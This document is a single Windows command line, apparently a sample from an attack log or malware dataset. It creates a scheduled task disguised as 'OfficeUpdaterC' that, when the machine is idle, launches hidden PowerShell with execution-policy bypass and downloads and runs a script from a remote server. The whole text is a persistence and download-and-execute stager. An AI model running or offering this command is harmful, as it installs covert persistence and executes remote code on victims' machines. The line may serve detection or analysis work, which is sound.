"schtasks.exe /create /tn OfficeUpdaterC /tr 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6''''))'' /sc onidle /i 30"
